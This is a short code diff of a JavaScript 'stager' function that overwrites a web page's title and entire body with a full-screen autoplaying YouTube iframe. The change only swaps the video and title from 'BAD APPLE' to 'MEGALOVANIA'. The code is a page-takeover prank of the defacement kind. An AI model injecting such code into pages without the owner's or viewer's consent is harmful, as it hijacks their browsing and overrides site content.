@@ -1,9 +1,10 @@
 // Override the document body
 function inject() {
   console.log("Stager: Injecting iframe...");
-  document.title = "BAD APPLE > DOM";
+  document.title = "MEGALOVANIA > DOM";
+
   document.getElementsByTagName("body")[0].innerHTML =
-    '<iframe src="https://www.youtube.com/embed/2qjNLt972ys?si=m2m_OAb088KesyXd?autoplay=1&controls=0&modestbranding=1&rel=0&showinfo=0" allow="autoplay; fullscreen" style="position:fixed; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;"></iframe>';
+    '<iframe src="https://www.youtube.com/embed/wDgQdr8ZkTw?si=gdS8RJnktcruB8EC?autoplay=1&controls=0&modestbranding=1&rel=0&showinfo=0" allow="autoplay; fullscreen" style="position:fixed; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;"></iframe>';
 }
 
 if (
